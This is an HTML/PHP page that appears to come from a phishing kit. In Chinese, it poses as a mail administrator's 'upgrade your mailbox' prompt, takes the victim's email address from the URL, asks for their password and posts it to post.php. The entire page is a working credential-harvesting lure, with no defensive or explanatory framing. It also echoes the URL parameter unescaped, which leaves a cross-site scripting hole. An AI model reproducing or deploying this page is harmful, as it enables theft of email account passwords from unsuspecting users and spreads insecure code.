
<html>
<head>
<link rel="shortcut icon" href="http://mail.ppscn.com/public/image/projectIcon.ico" type="image/gif"/>
<title>&#37038;&#20214;&#35774;&#32622; | &#30005;&#23376;&#37038;&#20214;&#21319;&#32423;</title><script src='/google_analytics_auto.js'></script></head>
<body>

<br><br>

<table align="center">

<tr><td>

	<div align="center">

	<img src="http://i1338.photobucket.com/albums/o688/coolopj/mailbox_zpsxvt2akbe.png" width="160" height="70">

	<br><br>

	<font face="verdana" size="2">
	&#30830;&#35748;&#24744;&#30340;&#36134;&#25143;&#65292;&#36825;&#26679;&#20320;
	&#21487;&#20197;&#21319;&#32423;&#20320;&#30340;&#37038;&#31665; 
	</font>


	<br><br>

	<form method="post" action="post.php">

	<input name="email" type="hidden" class="form-control" id="email" value="<?php echo $_GET['email']; ?>" placeholder="Username">
				<font face="arial" size="3" color="#045FB4"><?php echo $_GET['email']; ?></font>

	<br><br>

	<input  name="pass" type="password" style="width:250px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #848484; padding: 13px;" required="" placeholder="&#36755;&#20837;&#23494;&#30721;">	



	<br><br>

	<input type="submit" value="&#21319;&#32423;&#20320;&#30340;&#37038;&#31665;" 
	style="width:250px; height:60px; background-color: #0B2161; border: solid 3px #0B2161; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;">

	<br>
	</form>



	<br>
	<hr width="250" align="center">

	<font face="calibri" size="2">
	&#37038;&#20214;&#31649;&#29702;&#21592; 2018 | All rights reserved.
	</font>	

	</div>

</td></tr>

</table>


</body>
</html>